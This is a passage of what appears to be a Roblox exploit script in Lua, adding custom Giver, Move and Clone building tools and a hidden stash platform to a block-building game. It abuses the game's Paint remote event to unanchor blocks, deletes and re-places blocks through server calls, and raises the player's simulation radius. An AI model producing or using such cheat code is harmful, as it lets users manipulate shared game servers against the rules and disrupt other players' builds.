    giverSelecting = false
    for block, data in pairs(giverBlocks[giverSelMode]) do
        if not data.Active then
            if data.SelectionBox then data.SelectionBox:Destroy() end
            giverBlocks[giverSelMode][block] = nil
        else
            if data.SelectionBox then data.SelectionBox.LineThickness = -1 end
        end
    end
    GiverInfo.Text = "Selection cancelled"
    giverUpdateUI()
end)

-- Row 6: Remove Mode
createToolButton(_giverPanel.frame, "Remove Mode Blocks", 0.74, 0.03, 0.94, function()
    for block, data in pairs(giverBlocks[giverMode] or {}) do
        if data.OnTouched then pcall(function() data.OnTouched:Disconnect() end) end
        if data.SelectionBox then pcall(function() data.SelectionBox:Destroy() end) end
    end
    giverBlocks[giverMode] = {}
    if giverSelecting and giverSelMode == giverMode then giverSelecting = false end
    GiverInfo.Text = giverMode .. " blocks cleared"
    giverUpdateUI()
end)

-- Row 7: Remove All
createToolButton(_giverPanel.frame, "Remove All Blocks", 0.85, 0.03, 0.94, function()
    for mode, modeBlocks in pairs(giverBlocks) do
        for block, data in pairs(modeBlocks) do
            if data.OnTouched then pcall(function() data.OnTouched:Disconnect() end) end
            if data.SelectionBox then pcall(function() data.SelectionBox:Destroy() end) end
        end
        giverBlocks[mode] = {}
    end
    giverSelecting = false
    giverTagged    = {}
    GiverInfo.Text = "All giver blocks cleared"
    giverUpdateUI()
end)

function creategivertool()
    local connections = {}
    local gTool = Instance.new("Tool")
    gTool.Name = "Giver Tool"
    gTool.ToolTip = "Select blocks to give R6 or Carpet on touch"
    gTool.RequiresHandle = true

    local gHandle = Instance.new("Part")
    gHandle.Name = "Handle"
    gHandle.Size = Vector3.new(0.8, 0.8, 2.5)
    gHandle.Color = Color3.fromRGB(0, 200, 100)
    gHandle.Material = Enum.Material.SmoothPlastic
    gHandle.Reflectance = 0.2
    gHandle.CanCollide = false
    gHandle.Parent = gTool

    local equipped = false

    table.insert(connections, gTool.Equipped:Connect(function()
        equipped = true
        GiverGui.Enabled = true
        for mode, modeBlocks in pairs(giverBlocks) do
            for block, data in pairs(modeBlocks) do
                if data.Active then
                    data.SelectionBox.LineThickness = 0.05
                end
            end
        end
        giverUpdateUI()
        GiverInfo.Text = "Choose mode & select blocks"
    end))

    table.insert(connections, gTool.Unequipped:Connect(function()
        if not equipped then return end
        equipped = false
        GiverGui.Enabled = false
        if giverSelecting then
            giverSelecting = false
            for block, data in pairs(giverBlocks[giverSelMode]) do
                if not data.Active then
                    data.SelectionBox:Destroy()
                    giverBlocks[giverSelMode][block] = nil
                else
                    data.SelectionBox.LineThickness = -1
                end
            end
        else
            for mode, modeBlocks in pairs(giverBlocks) do
                for block, data in pairs(modeBlocks) do
                    if data.Active and data.SelectionBox then
                        data.SelectionBox.LineThickness = -1
                    end
                end
            end
        end
    end))

    table.insert(connections, mouse.Button1Down:Connect(function()
        if not equipped or not giverSelecting then return end
        local target = mouse.Target
        if not target or not target:IsDescendantOf(cfolder) then return end
        local mode = giverSelMode
        if giverBlocks[mode][target] then
            local data = giverBlocks[mode][target]
            if data.OnTouched then data.OnTouched:Disconnect() end
            data.SelectionBox:Destroy()
            giverBlocks[mode][target] = nil
            GiverInfo.Text = "Block removed from " .. mode
        else
            local bbox = Instance.new("SelectionBox")
            bbox.Color3 = Color3.fromRGB(0, 170, 255)
            bbox.LineThickness = 0.1
            bbox.SurfaceColor3 = Color3.fromRGB(13, 105, 172)
            bbox.SurfaceTransparency = 0.7
            bbox.Adornee = target
            bbox.Parent = game.CoreGui
            table.insert(tools, {bbox})
            giverBlocks[mode][target] = {SelectionBox = bbox, Block = target, Active = false, OnTouched = nil}
            GiverInfo.Text = "Added to " .. mode .. " (click Finish)"
        end
        giverUpdateUI()
    end))

    table.insert(connections, gTool.AncestryChanged:Connect(function()
        if not gTool or not gTool.Parent or not gTool.Parent.Parent then
            for _, c in pairs(connections) do c:Disconnect() end
            GiverGui.Enabled = false
        end
    end))

    table.insert(tools, {gTool})
    gTool.Parent = localplr.Backpack
    task.wait()
    return gTool
end

AdvancedGroup:CreateButton({
    Name = 'Giver Tool',
    Function = function()
        creategivertool().Parent = (plr.Character and not plr.Character:FindFirstChildWhichIsA("Tool") and plr.Character) or plr.Backpack
        Library:Notify("Giver tool added to backpack", 3)
    end
})

-- ===== MOVE TOOL =====
end -- /══ Giver Tool ══

do -- ══ Move Tool ══
local _mvSel         = nil
local _mvOrigCF      = nil
local _mvWasAnchored = false
local _mvHandles     = nil
local _mvDragStart   = nil
local _mvSnapEnabled = true

local _mvPanel = createToolPanel({
    name       = "MoveToolGui",
    title      = "Move Tool",
    anchor     = Vector2.new(1, 0),
    position   = UDim2.new(1, -10, 0.15, 0),
    size       = UDim2.new(0, 205, 0, 190),
    statusText = "Click a block to select"
})
local MoveGui  = _mvPanel.gui
local MoveInfo = _mvPanel.status
MoveGui.Enabled = false

local function mvPaintEv()
    local pt = localplr.Character and (localplr.Character:FindFirstChild("Paint") or localplr.Backpack:FindFirstChild("Paint"))
    if not pt then return nil end
    if pt.Parent ~= localplr.Character then pt.Parent = localplr.Character; task.wait() end
    local ps = pt:FindFirstChild("Script")
    if ps and ps:FindFirstChild("Event") then return ps.Event end
    return nil
end

local function mvCleanHandles()
    if _mvHandles then _mvHandles:Destroy(); _mvHandles = nil end
    _mvDragStart = nil
end

local function doMvConfirm()
    if not _mvSel or not _mvSel.Parent then
        mvCleanHandles(); _mvSel = nil
        MoveInfo.Text = "Click a block to select"
        return
    end

    local part     = _mvSel
    local wasAnch  = _mvWasAnchored

    -- Snapshot all block data at its current (dragged) position
    local snapData = pcall and (function()
        local d = saveblock(part)
        return d
    end)()
    if not snapData or not snapData.p then
        -- Fallback: just re-anchor client-side only
        if wasAnch then
            local ev = mvPaintEv()
            if ev then pcall(function() ev:FireServer(part, Enum.NormalId.Top, getplrpos(), "material", nil, "anchor", "") end) end
        end
        mvCleanHandles(); _mvSel = nil
        MoveInfo.Text = "Placed. Click a block to select"
        return
    end

    mvCleanHandles()
    _mvSel = nil
    MoveInfo.Text = "Moving server-side..."

    task.spawn(function()
        -- Re-anchor temporarily so server knows stable position before delete
        if not part.Anchored then
            local ev = mvPaintEv()
            if ev then pcall(function() ev:FireServer(part, Enum.NormalId.Top, getplrpos(), "material", nil, "anchor", "") end) end
            task.wait(0.2)
        end

        -- Delete the original block server-side using the existing bkit Delete tool
        local deleted = pcall(function()
            if isog then ExecuteDeleteOG(part) else ExecuteDelete(part) end
        end)
        task.wait(0.35)

        -- Re-place at new position via the bkit Build system
        pcall(function()
            local col      = snapData.c and Color3.fromRGB(table.unpack(snapData.c)) or Color3.fromRGB(192,192,192)
            local mat      = snapData.m
            local bsizev3  = snapData.s and Vector3.new(table.unpack(snapData.s)) or nil
            local origmat  = snapData.o
            local sprays   = snapData.sp
            local anchored = snapData.a ~= false
            local collide  = snapData.cc ~= false
            local pos      = Vector3.new(table.unpack(snapData.p))
            buildblock(pos, mat, col, nil, bsizev3, true, origmat, sprays, anchored, collide)
        end)

        MoveInfo.Text = "Placed. Click a block to select"
    end)
end

local function doMvCancel()
    if _mvSel and _mvSel.Parent then
        if _mvOrigCF then _mvSel.CFrame = _mvOrigCF end
        if _mvWasAnchored and not _mvSel.Anchored then
            local ev = mvPaintEv()
            if ev then ev:FireServer(_mvSel, Enum.NormalId.Top, getplrpos(), "material", nil, "anchor", "") end
        end
    end
    mvCleanHandles()
    MoveInfo.Text = "Cancelled. Click a block to select"
    _mvSel = nil
end

local mvSnapBtn = createToolButton(_mvPanel.frame, "Snap: ON  (G)", 0.28, 0.05, 0.90, function()
    _mvSnapEnabled = not _mvSnapEnabled
    mvSnapBtn.Text = _mvSnapEnabled and "Snap: ON  (G)" or "Snap: OFF (G)"
    mvSnapBtn.BackgroundColor3 = _mvSnapEnabled and Color3.fromRGB(0, 130, 0) or Color3.fromRGB(150, 40, 0)
end)
mvSnapBtn.BackgroundColor3 = Color3.fromRGB(0, 130, 0)

createToolButton(_mvPanel.frame, "Confirm", 0.48, 0.05, 0.42, doMvConfirm)
createToolButton(_mvPanel.frame, "Cancel  (R)", 0.48, 0.52, 0.42, doMvCancel)
createToolLabel(_mvPanel.frame, "G = snap   R = cancel", 0.70)

function createmovetool()
    local connections = {}
    local mvTool = Instance.new("Tool")
    mvTool.Name           = "Move Tool"
    mvTool.ToolTip        = "Click a block then drag the arrows to move it"
    mvTool.RequiresHandle = true

    local mvHandlePart = Instance.new("Part")
    mvHandlePart.Name        = "Handle"
    mvHandlePart.Size        = Vector3.new(0.6, 0.6, 2.5)
    mvHandlePart.Color       = Color3.fromRGB(0, 180, 255)
    mvHandlePart.Material    = Enum.Material.SmoothPlastic
    mvHandlePart.Reflectance = 0.35
    mvHandlePart.CanCollide  = false
    mvHandlePart.Parent      = mvTool
    do
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId   = "rbxassetid://430736398"
        mesh.Scale    = Vector3.new(0.35, 0.35, 0.5)
        mesh.Parent   = mvHandlePart
    end

    local equipped = false

    local mvSBox = Instance.new("SelectionBox")
    mvSBox.Color3              = Color3.fromRGB(0, 200, 255)
    mvSBox.SurfaceColor3       = Color3.fromRGB(0, 200, 255)
    mvSBox.SurfaceTransparency = 0.92
    mvSBox.LineThickness       = 0.05
    mvSBox.Parent              = game.CoreGui
    table.insert(tools, {mvSBox})

    local function selectBlock(part)
        doMvConfirm()

        _mvSel         = part
        _mvOrigCF      = part.CFrame
        _mvWasAnchored = part.Anchored
        mvSBox.Adornee = part
        MoveInfo.Text  = "Unanchoring..."

        if part.Anchored then
            local ev = mvPaintEv()
            if ev then ev:FireServer(part, Enum.NormalId.Top, getplrpos(), "material", nil, "anchor", "") end
            task.wait(0.2)
        end

        pcall(function() localplr.SimulationRadius = math.huge end)
        task.wait(0.1)

        mvCleanHandles()
        local h = Instance.new("Handles")
        h.Adornee = part
        h.Style   = Enum.HandlesStyle.Movement
        h.Color3  = Color3.fromRGB(255, 210, 0)
        h.Parent  = game.CoreGui
        _mvHandles = h

        h.MouseButton1Down:Connect(function()
            _mvDragStart = part.CFrame
        end)
        h.MouseDrag:Connect(function(face, dist)
            if not _mvDragStart then return end
            local d = _mvSnapEnabled and (math.round(dist / gridSize) * gridSize) or dist
            part.CFrame = _mvDragStart * CFrame.new(Vector3.fromNormalId(face) * d)
            pcall(function() localplr.SimulationRadius = math.huge end)
        end)

        MoveInfo.Text = "Drag arrows to move.\nConfirm or Cancel when done."
    end

    table.insert(connections, mvTool.Equipped:Connect(function()
        equipped = true
        MoveGui.Enabled = true
        MoveInfo.Text = "Click a block to select"
    end))

    table.insert(connections, mvTool.Unequipped:Connect(function()
        if not equipped then return end
        equipped = false
        doMvCancel()
        MoveGui.Enabled = false
        mvSBox.Adornee = nil
    end))

    table.insert(connections, mouse.Button1Down:Connect(function()
        if not equipped then return end
        local target = mouse.Target
        if target and target ~= _mvSel and IsSelectable(target, mouse.Hit.Position) then
            task.spawn(function() selectBlock(target) end)
        end
    end))

    table.insert(connections, UserInputService.InputBegan:Connect(function(input, gp)
        if gp or not equipped then return end
        if input.KeyCode == Enum.KeyCode.G then
            _mvSnapEnabled = not _mvSnapEnabled
            mvSnapBtn.Text = _mvSnapEnabled and "Snap: ON  (G)" or "Snap: OFF (G)"
            mvSnapBtn.BackgroundColor3 = _mvSnapEnabled and Color3.fromRGB(0, 130, 0) or Color3.fromRGB(150, 40, 0)
            MoveInfo.Text = "Snap: " .. (_mvSnapEnabled and "ON" or "OFF")
        elseif input.KeyCode == Enum.KeyCode.R then
            doMvCancel()
        end
    end))

    table.insert(connections, mvTool.AncestryChanged:Connect(function()
        if not mvTool or not mvTool.Parent or not mvTool.Parent.Parent then
            for _, c in pairs(connections) do c:Disconnect() end
            mvCleanHandles()
            mvSBox:Destroy()
            MoveGui.Enabled = false
        end
    end))

    table.insert(tools, {mvTool})
    mvTool.Parent = localplr.Backpack
    task.wait()
    return mvTool
end

AdvancedGroup:CreateButton({
    Name = 'Move Tool',
    Function = function()
        createmovetool().Parent = (plr.Character and not plr.Character:FindFirstChildWhichIsA("Tool") and plr.Character) or plr.Backpack
        Library:Notify("Move tool added to backpack", 3)
    end
})

stopStash = false
stashRunning = false
stashPosition = getgenv().stashposition or Vector3.new(
    math.random(5000, 10000) * (math.random(2) == 1 and 1 or -1),
    math.random(1000, 3000),
    math.random(5000, 10000) * (math.random(2) == 1 and 1 or -1)
)
getgenv().stashposition = stashPosition

end -- /══ Move Tool ══

do -- ══ Clone Tool (Ctool) ══

local _ctAddMode = false
local _ctAddModeBtn

-- ── Panel (created once, shared across tool instances) ───────────────────
local _ctPanel = createToolPanel({
    name       = "CloneToolGui",
    title      = "Clone Tool (Ctool)",
    anchor     = Vector2.new(1, 0),
    position   = UDim2.new(1, -10, 0.15, 0),
    size       = UDim2.new(0, 215, 0, 390),
    statusText = "Drag screen to box-select blocks"
})
local CloneGui  = _ctPanel.gui
local CloneInfo = _ctPanel.status
CloneGui.Enabled = false

_ctAddModeBtn = createToolButton(_ctPanel.frame, "Add Mode: OFF", 0.89, 0.05, 0.90, function()
    _ctAddMode = not _ctAddMode
    _ctAddModeBtn.Text = _ctAddMode and "Add Mode: ON" or "Add Mode: OFF"
    _ctAddModeBtn.BackgroundColor3 = _ctAddMode
        and Color3.fromRGB(0, 130, 0) or Color3.fromRGB(80, 80, 80)
end)

local _ctCountLabel  = createToolLabel(_ctPanel.frame, "Selected: 0 blocks",  0.07)
local _ctOffsetLabel = createToolLabel(_ctPanel.frame, "Offset: 0, 0, 0",     0.14)

local _ctSnapBtn = createToolButton(_ctPanel.frame, "Snap: ON  (G)", 0.22, 0.05, 0.90, nil)
_ctSnapBtn.BackgroundColor3 = Color3.fromRGB(0, 130, 0)

local _ctConfirmBtn = createToolButton(_ctPanel.frame, "▶  Confirm Clone",   0.33, 0.05, 0.90, nil)
local _ctCancelBtn  = createToolButton(_ctPanel.frame, "Cancel  (R)",         0.44, 0.05, 0.45, nil)
local _ctClearBtn   = createToolButton(_ctPanel.frame, "Clear Sel.",          0.44, 0.52, 0.45, nil)
local _ctStopBtn    = createToolButton(_ctPanel.frame, "■  Stop Building",    0.55, 0.05, 0.90, function()
    stopped = true
    Library:Notify("Clone build stopped!", 3)
end)

createToolLabel(_ctPanel.frame, "G = snap  |  R = cancel",           0.66)
createToolLabel(_ctPanel.frame, "Shift + drag = add to selection",   0.73)
createToolLabel(_ctPanel.frame, "Drag yellow arrows to set offset",  0.80)

-- ── Module-level state (survives equip/unequip cycles) ───────────────────
local _ctSel         = {}          -- [part] = true
local _ctSelBoxes    = {}          -- [part] = SelectionBox
local _ctOffset      = Vector3.zero
local _ctSnapEnabled = true
local _ctSelCenter   = Vector3.zero
local _ctHandles     = nil
local _ctPrimPart    = nil         -- invisible anchor for Handles
local _ctDragStart   = nil         -- offset snapshot when handle drag begins
local _ctBuilding    = false

-- Drag-select overlay (lives in CoreGui so it renders above everything)
local _ctDragging    = false
local _ctDragOrigin  = Vector2.zero
local _ctDragCurrent = Vector2.zero
local _ctHasMoved    = false

local _ctDragGui = Instance.new("ScreenGui")
_ctDragGui.Name             = "CToolDragSelect"
_ctDragGui.IgnoreGuiInset   = true
_ctDragGui.ResetOnSpawn     = false
_ctDragGui.ZIndexBehavior   = Enum.ZIndexBehavior.Sibling
_ctDragGui.Enabled          = false
_ctDragGui.Parent           = CoreGui

local _ctDragFrame = Instance.new("Frame")
_ctDragFrame.BackgroundColor3       = Color3.fromRGB(0, 130, 215)
_ctDragFrame.BackgroundTransparency = 0.72
_ctDragFrame.BorderSizePixel        = 0
_ctDragFrame.ZIndex                 = 20
_ctDragFrame.Size                   = UDim2.fromOffset(0, 0)
_ctDragFrame.Parent                 = _ctDragGui

local _ctDragStroke = Instance.new("UIStroke")
_ctDragStroke.Color     = Color3.fromRGB(0, 170, 255)
_ctDragStroke.Thickness = 1.5
_ctDragStroke.Parent    = _ctDragFrame

-- ── Helper functions ─────────────────────────────────────────────────────
local function _ctUpdateCount()
    local n = 0
    for _ in pairs(_ctSel) do n = n + 1 end
    _ctCountLabel.Text = "Selected: " .. n .. " block(s)"
    return n
end

local function _ctUpdateOffsetLabel()
    _ctOffsetLabel.Text = string.format(
        "Offset: %.0f, %.0f, %.0f",
        _ctOffset.X, _ctOffset.Y, _ctOffset.Z)
end

local function _ctComputeCenter()
    local sum = Vector3.zero
    local n   = 0
    for part in pairs(_ctSel) do
        if part.Parent then
            sum = sum + part.Position
            n   = n + 1
        end
    end
    return n > 0 and (sum / n) or Vector3.zero
end

local function _ctHighlight(part, on)
    if on then
        if _ctSelBoxes[part] then return end
        local sb = Instance.new("SelectionBox")
        sb.Color3              = Color3.fromRGB(0, 180, 255)
        sb.SurfaceColor3       = Color3.fromRGB(0, 120, 200)
        sb.SurfaceTransparency = 0.72
        sb.LineThickness       = 0.055
        sb.Adornee             = part
        sb.Parent              = CoreGui
        _ctSelBoxes[part]      = sb
    else
        if _ctSelBoxes[part] then
            _ctSelBoxes[part]:Destroy()
            _ctSelBoxes[part] = nil
        end
    end
end

local function _ctClearSelection()
    for part in pairs(_ctSel) do
        _ctHighlight(part, false)
    end
    _ctSel       = {}
    _ctOffset    = Vector3.zero
    _ctSelCenter = Vector3.zero
    if _ctHandles  then _ctHandles:Destroy();  _ctHandles  = nil end
    if _ctPrimPart then _ctPrimPart:Destroy(); _ctPrimPart = nil end
    _ctDragStart = nil
    _ctUpdateCount()
    _ctUpdateOffsetLabel()
end

local function _ctBuildHandles()
    -- Remove old handles/anchor first
    if _ctHandles  then _ctHandles:Destroy();  _ctHandles  = nil end
    if _ctPrimPart then _ctPrimPart:Destroy(); _ctPrimPart = nil end

    _ctSelCenter = _ctComputeCenter()
    local n = 0
    for _ in pairs(_ctSel) do n = n + 1 end
    if n == 0 then return end

    -- Invisible anchor part that the Handles adorn
    _ctPrimPart             = Instance.new("Part")
    _ctPrimPart.Anchored    = true
    _ctPrimPart.CanCollide  = false
    _ctPrimPart.CanQuery    = false
    _ctPrimPart.CastShadow  = false
    _ctPrimPart.Transparency = 1
    _ctPrimPart.Size        = Vector3.one
    _ctPrimPart.CFrame      = CFrame.new(_ctSelCenter + _ctOffset)
    _ctPrimPart.Parent      = workspace

    local h = Instance.new("Handles")
    h.Adornee = _ctPrimPart
    h.Style   = Enum.HandlesStyle.Movement
    h.Color3  = Color3.fromRGB(255, 200, 0)
    h.Parent  = CoreGui
    _ctHandles = h

    h.MouseButton1Down:Connect(function()
        _ctDragStart = _ctOffset
    end)
    h.MouseDrag:Connect(function(face, dist)
        if not _ctDragStart then return end
        local d = _ctSnapEnabled
            and (math.round(dist / gridSize) * gridSize)
            or dist
        _ctOffset = _ctDragStart + Vector3.fromNormalId(face) * d
        _ctPrimPart.CFrame = CFrame.new(_ctSelCenter + _ctOffset)
        _ctUpdateOffsetLabel()
    end)
end

-- Finds all bricks (from cfolder) whose centre projects into a screen rectangle
local function _ctGetBlocksInRect(x0, y0, x1, y1)
    local minX = math.min(x0, x1)
    local maxX = math.max(x0, x1)
    local minY = math.min(y0, y1)
    local maxY = math.max(y0, y1)
    -- Ignore degenerate rectangles (simple click without drag)
    if (maxX - minX) < 4 or (maxY - minY) < 4 then return {} end
    local cam   = workspace.CurrentCamera
    local found = {}
    for _, obj in ipairs(cfolder:GetDescendants()) do
        if obj:IsA("BasePart") then
            local sp, vis = cam:WorldToScreenPoint(obj.Position)
            if vis and sp.X >= minX and sp.X <= maxX
                    and sp.Y >= minY and sp.Y <= maxY then
                table.insert(found, obj)
            end
        end
    end
    return found
end

local function _ctUpdateDragFrame()
    local x0 = math.min(_ctDragOrigin.X,  _ctDragCurrent.X)
    local y0 = math.min(_ctDragOrigin.Y,  _ctDragCurrent.Y)
    local w  = math.abs(_ctDragCurrent.X  - _ctDragOrigin.X)
    local h  = math.abs(_ctDragCurrent.Y  - _ctDragOrigin.Y)
    _ctDragFrame.Position = UDim2.fromOffset(x0, y0)
    _ctDragFrame.Size     = UDim2.fromOffset(w,  h)
end

-- ── Tool factory ──────────────────────────────────────────────────────────
function createclonetool()
    local connections = {}

    local cTool = Instance.new("Tool")
    cTool.Name           = "Clone Tool"
    cTool.ToolTip        = "Drag-select blocks, move the offset, then Confirm to clone"
    cTool.RequiresHandle = true

    local cHandle = Instance.new("Part")
    cHandle.Name        = "Handle"
    cHandle.Size        = Vector3.new(0.7, 0.7, 2.5)
    cHandle.Color       = Color3.fromRGB(0, 200, 140)
    cHandle.Material    = Enum.Material.SmoothPlastic
    cHandle.Reflectance = 0.3
    cHandle.CanCollide  = false
    cHandle.Parent      = cTool
    do
        local mesh = Instance.new("SpecialMesh")
        mesh.MeshType = Enum.MeshType.FileMesh
        mesh.MeshId   = "rbxassetid://430736398"
        mesh.Scale    = Vector3.new(0.35, 0.35, 0.5)
        mesh.Parent   = cHandle
    end

    local equipped = false

    -- ── confirm logic ─────────────────────────────────────────────────────
    local function doConfirm()
        if _ctBuilding then Library:Notify("Already cloning!", 2); return end
        local n = 0
        for _ in pairs(_ctSel) do n = n + 1 end
        if n == 0 then Library:Notify("Nothing selected! Drag to select blocks first.", 3); return end

        -- Snapshot all block data at their original positions
        local buildData = {}
        for part in pairs(_ctSel) do
            if part.Parent then
                local bd = saveblock(part)
                if bd and bd.p then
                    table.insert(buildData, bd)
                end
            end
        end
        if #buildData == 0 then Library:Notify("Could not read block data!", 3); return end

        local appliedOffset = _ctOffset
        local appliedCenter = _ctSelCenter

        _ctBuilding = true
        CloneInfo.Text = "Cloning " .. #buildData .. " block(s)…"

        task.spawn(function()
            stopped           = false
            totalBuildBlocks  = #buildData
            currentBlockIndex = 0
            _buildStartTime   = tick()
            updateBuildProgress()

            -- Sort by distance from spawn so near blocks go first (same as Import Build)
            buildData = sortBlocksByDistanceFromSpawn(buildData)

            for i, v in ipairs(buildData) do
                if stopped then break end
                currentBlockIndex = i
                updateBuildProgress()

                local posses = v.p
                if not posses then continue end

                local bsz     = v.s and Vector3.new(table.unpack(v.s))
                              or Vector3.new(gridSize, gridSize, gridSize)
                local halfOff = Vector3.new(bsz.X/2 - 0.5, bsz.Y/2 - 0.5, bsz.Z/2 - 0.5)

                -- Translate by the user-defined offset
                local origCenter = Vector3.new(posses[1], posses[2], posses[3]) + halfOff
                local newCenter  = origCenter + appliedOffset
                local pos        = newCenter - halfOff

                local col = v.c and Color3.fromRGB(table.unpack(v.c))
                          or Color3.fromRGB(192, 192, 192)
                local mat = v.m

                -- Show local preview part while server-side place catches up
                createpartrepl(pos, bsz, col,
                    swappedmaterials[mat] or Enum.Material.SmoothPlastic)

                buildblock(pos, mat, col, nil, bsz, true,
                    v.o, v.sp, v.a, v.cc)
            end

            stopped           = false
            totalBuildBlocks  = 0
            currentBlockIndex = 0
            updateBuildProgress()
            _ctBuilding = false

            local placed = #buildData
            CloneInfo.Text = "Done! " .. placed .. " block(s) cloned."
            Library:Notify("Clone complete — " .. placed .. " blocks placed.", 5)
        end)
    end

    -- ── cancel / clear logic ──────────────────────────────────────────────
    local function doCancel()
        _ctClearSelection()
        CloneInfo.Text = "Cancelled. Drag to re-select."
    end

    -- Wire panel button callbacks for this tool instance
    local _confConn  = _ctConfirmBtn.MouseButton1Click:Connect(doConfirm)
    local _cancConn  = _ctCancelBtn.MouseButton1Click:Connect(doCancel)
    local _clearConn = _ctClearBtn.MouseButton1Click:Connect(function()
        _ctClearSelection()
        CloneInfo.Text = "Selection cleared. Drag to re-select."
    end)
    local _snapConn  = _ctSnapBtn.MouseButton1Click:Connect(function()
        _ctSnapEnabled = not _ctSnapEnabled
        _ctSnapBtn.Text = _ctSnapEnabled and "Snap: ON  (G)" or "Snap: OFF (G)"
        _ctSnapBtn.BackgroundColor3 = _ctSnapEnabled
            and Color3.fromRGB(0, 130, 0)
            or  Color3.fromRGB(150, 40, 0)
    end)

    -- ── equip / unequip ───────────────────────────────────────────────────
    table.insert(connections, cTool.Equipped:Connect(function()
        equipped = true
        CloneGui.Enabled = true
        _ctUpdateCount()
        _ctUpdateOffsetLabel()
        CloneInfo.Text = "Drag screen to box-select blocks"
    end))

    table.insert(connections, cTool.Unequipped:Connect(function()
        if not equipped then return end
        equipped = false
        CloneGui.Enabled = false
        _ctDragging = false
        _ctDragGui.Enabled = false
    end))

    -- ── mouse drag-select ─────────────────────────────────────────────────
    table.insert(connections, UserInputService.InputBegan:Connect(function(inp, gp)
        if not equipped then return end

        -- Keyboard shortcuts (gp doesn't block these)
        if inp.KeyCode == Enum.KeyCode.G then
            _ctSnapEnabled = not _ctSnapEnabled
            _ctSnapBtn.Text = _ctSnapEnabled and "Snap: ON  (G)" or "Snap: OFF (G)"
            _ctSnapBtn.BackgroundColor3 = _ctSnapEnabled
                and Color3.fromRGB(0, 130, 0) or Color3.fromRGB(150, 40, 0)
            return
        end
        if inp.KeyCode == Enum.KeyCode.R then
            doCancel(); return
        end

        -- Don't start a drag if the user clicked on a GUI element
        if gp then return end

        if inp.UserInputType == Enum.UserInputType.MouseButton1
        or inp.UserInputType == Enum.UserInputType.Touch then
            _ctDragging    = true
            _ctHasMoved    = false
            _ctDragOrigin  = Vector2.new(inp.Position.X, inp.Position.Y)
            _ctDragCurrent = _ctDragOrigin
            _ctDragFrame.Size     = UDim2.fromOffset(0, 0)
            _ctDragFrame.Position = UDim2.fromOffset(inp.Position.X, inp.Position.Y)
            _ctDragGui.Enabled    = true
        end
    end))

    table.insert(connections, UserInputService.InputChanged:Connect(function(inp)
        if not equipped or not _ctDragging then return end
        if inp.UserInputType == Enum.UserInputType.MouseMovement
        or inp.UserInputType == Enum.UserInputType.Touch then
            _ctDragCurrent = Vector2.new(inp.Position.X, inp.Position.Y)
            if (_ctDragCurrent - _ctDragOrigin).Magnitude > 5 then
                _ctHasMoved = true
            end
            _ctUpdateDragFrame()
        end
    end))

    table.insert(connections, UserInputService.InputEnded:Connect(function(inp, gp)
        if not equipped then return end
        if inp.UserInputType ~= Enum.UserInputType.MouseButton1
        and inp.UserInputType ~= Enum.UserInputType.Touch then return end

        _ctDragging        = false
        _ctDragGui.Enabled = false

        if _ctHasMoved then
            local x0, y0 = _ctDragOrigin.X,  _ctDragOrigin.Y
            local x1, y1 = _ctDragCurrent.X, _ctDragCurrent.Y
            local found  = _ctGetBlocksInRect(x0, y0, x1, y1)

            -- Hold Shift to ADD to current selection; otherwise replace it
            local shiftHeld = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift)
            if not shiftHeld and not _ctAddMode then
                _ctClearSelection()
            end

            for _, part in ipairs(found) do
                if not _ctSel[part] then
                    _ctSel[part] = true
                    _ctHighlight(part, true)
                end
            end

            local n = _ctUpdateCount()
            if n > 0 then
                _ctBuildHandles()
                CloneInfo.Text = n .. " block(s) selected. Drag yellow arrows → Confirm."
            else
                CloneInfo.Text = "No blocks in area. Try a larger drag rectangle."
            end
        end

        _ctHasMoved = false
    end))

    -- ── cleanup when tool is destroyed / dropped ──────────────────────────
    table.insert(connections, cTool.AncestryChanged:Connect(function()
        if cTool and cTool.Parent and cTool.Parent.Parent then return end
        for _, c in ipairs(connections) do pcall(function() c:Disconnect() end) end
        _confConn:Disconnect(); _cancConn:Disconnect()
        _clearConn:Disconnect(); _snapConn:Disconnect()
        _ctDragging        = false
        _ctDragGui.Enabled = false
        CloneGui.Enabled   = false
    end))

    table.insert(tools, {cTool})
    cTool.Parent = localplr.Backpack
    task.wait()
    return cTool
end

-- Button in the Custom Tools groupbox
AdvancedGroup:CreateButton({
    Name = 'Clone Tool (Ctool)',
    Function = function()
        createclonetool().Parent =
            (plr.Character and not plr.Character:FindFirstChildWhichIsA("Tool") and plr.Character)
            or plr.Backpack
        Library:Notify("Clone Tool added — drag screen to select, then Confirm!", 5)
    end
})

end -- /══ Clone Tool (Ctool) ══

do -- ══ Stash System Core ══
stashPlatform = getgenv().invisstashplatform or Instance.new("Part")
stashPlatform.CFrame = CFrame.new(stashPosition - Vector3.new(0, 10, 0))
stashPlatform.Anchored = true
stashPlatform.Transparency = 1
stashPlatform.CanCollide = false
stashPlatform.Color = Color3.fromRGB(0, 255, 0)
stashPlatform.Size = Vector3.new(200, 1, 200)
stashPlatform.Parent = workspace
getgenv().invisstashplatform = stashPlatform

 function checkStash()

    local hasEnlighten = plr.Character:FindFirstChild("The Arkenstone") 
        or plr.Backpack:FindFirstChild("The Arkenstone")
    
    if not hasEnlighten then
        stopStash = true
        return false
    end

    return true
end

 function equipEnlighten(unequipOthers)
    if unequipOthers then
        for _, tool in pairs(plr.Character:GetChildren()) do
            if tool:IsA("Tool") and tool.Name ~= "The Arkenstone" then
                tool.Parent = plr.Backpack
            end
        end
    end
    
    if plr.Character:FindFirstChild("The Arkenstone") then
        return true
    elseif plr.Backpack:FindFirstChild("The Arkenstone") then
        plr.Backpack["The Arkenstone"].Parent = plr.Character
        return true
    end
    return false
end

 function equipBlueBucket()
    if plr.Character:FindFirstChild("BlueBucket") then
        return true
    elseif plr.Backpack:FindFirstChild("BlueBucket") then
        plr.Backpack["BlueBucket"].Parent = plr.Character
        return true
    end
    return false
end

function CreatePlatform()
    local hrp = GetCharacterPart("HumanoidRootPart")
    if hrp then
        local platform = Instance.new("Part")
        platform.Name = "RomazPlatform"
        platform.Size = Vector3.new(50, 1, 50)
        platform.Position = hrp.Position + Vector3.new(0, -5, 0)
        platform.Anchored = true
        platform.Transparency = 0.3
        platform.Color = Color3.new(0, 1, 0)
        platform.CanCollide = true
        platform.Parent = workspace
        Library:Notify("Platform created below you", 3)
    end
end

function ClearPlatform()
    local platform = workspace:FindFirstChild("RomazPlatform")
    if platform then
        platform:Destroy()
        Library:Notify("Platform removed", 3)
    end
end

 function hasEnlighten()
    return plr.Character:FindFirstChild("The Arkenstone") ~= nil
